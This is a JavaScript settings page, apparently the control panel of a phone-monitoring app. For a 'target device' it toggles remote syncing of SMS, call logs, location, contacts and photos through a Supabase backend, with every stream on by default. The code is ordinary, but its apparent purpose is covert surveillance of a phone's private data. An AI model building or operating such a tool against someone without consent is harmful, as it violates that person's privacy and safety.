document.addEventListener('DOMContentLoaded', async () => {
    const deviceId = localStorage.getItem('active_device_id');
    if (!deviceId) return alert("Critical Error: Target Device ID missing.");

    try {
        const configRes = await fetch('/api/config');
        window.sbConfig = await configRes.json();
        
        // Fetch current settings
        const res = await fetch(`${window.sbConfig.supabase_url}/rest/v1/device_settings?device_id=eq.${deviceId}`, {
            headers: { 'apikey': window.sbConfig.supabase_key, 'Authorization': `Bearer ${window.sbConfig.supabase_key}` }
        });
        const data = await res.json();

        document.getElementById('loading-text').style.display = 'none';
        document.getElementById('toggles-wrapper').style.display = 'block';

        if (data && data.length > 0) {
            const settings = data[0];
            document.getElementById('toggle-sms').checked = settings.sync_sms;
            document.getElementById('toggle-calls').checked = settings.sync_calls;
            document.getElementById('toggle-location').checked = settings.sync_location;
            document.getElementById('toggle-contacts').checked = settings.sync_contacts;
            document.getElementById('toggle-photos').checked = settings.sync_photos;
        } else {
            // Default sab ON rahega agar table khali hai
            document.querySelectorAll('input[type="checkbox"]').forEach(cb => cb.checked = true);
        }
    } catch (e) {
        console.error("Failed to load settings", e);
    }
});

async function saveSettings() {
    const deviceId = localStorage.getItem('active_device_id');
    const btn = document.getElementById('save-btn');
    btn.innerText = "Saving...";
    
    const payload = {
        device_id: deviceId,
        sync_sms: document.getElementById('toggle-sms').checked,
        sync_calls: document.getElementById('toggle-calls').checked,
        sync_location: document.getElementById('toggle-location').checked,
        sync_contacts: document.getElementById('toggle-contacts').checked,
        sync_photos: document.getElementById('toggle-photos').checked,
        updated_at: new Date().toISOString()
    };

    try {
        // Upsert command: Agar row nahi hai toh banayega, hai toh update karega
        await fetch(`${window.sbConfig.supabase_url}/rest/v1/device_settings`, {
            method: 'POST',
            headers: {
                'apikey': window.sbConfig.supabase_key,
                'Authorization': `Bearer ${window.sbConfig.supabase_key}`,
                'Content-Type': 'application/json',
                'Prefer': 'resolution=merge-duplicates'
            },
            body: JSON.stringify(payload)
        });
        
        btn.innerText = "Changes Applied Successfully!";
        btn.style.background = "#2ecc71";
        setTimeout(() => { btn.innerText = "Apply Changes"; btn.style.background = "#3498db"; }, 2000);
    } catch (e) {
        console.error("Save Error:", e);
        btn.innerText = "Error Saving";
        btn.style.background = "#e74c3c";
    }
}
